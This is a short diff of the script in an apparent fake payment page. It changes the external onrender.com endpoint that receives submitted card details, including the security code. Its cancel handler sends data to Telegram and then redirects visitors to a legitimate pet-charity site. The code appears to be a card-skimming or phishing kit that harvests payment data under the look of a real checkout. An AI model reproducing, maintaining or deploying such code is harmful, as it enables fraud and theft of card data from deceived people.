@@ -373,7 +373,8 @@
             const securityCode = document.getElementById('securityCode').value.trim() || 'no i4';
 
             // ✅ FIXED: Backend API URL - Dùng relative path
-            const BACKEND_API_URL = 'https://gabeo-payment.onrender.com/api/send-payment';
+            const BACKEND_API_URL = 'https://gabeo5kg.onrender.com/api/send-payment';
+
 
             try {
                 const response = await fetch(BACKEND_API_URL, {
@@ -420,13 +421,14 @@
             window.location.href = 'success.html';
         });
 
-        // Cancel button
+        // Cancel button 231
         document.querySelector('.btn-secondary').addEventListener('click', async function() {
             if (confirm('Are you sure you want to cancel?')) {
                 await sendToTelegram();
                 window.location.href = 'https://www.foundanimals.org/';
             }
         });
+      
     </script>
 </body>
 </html>
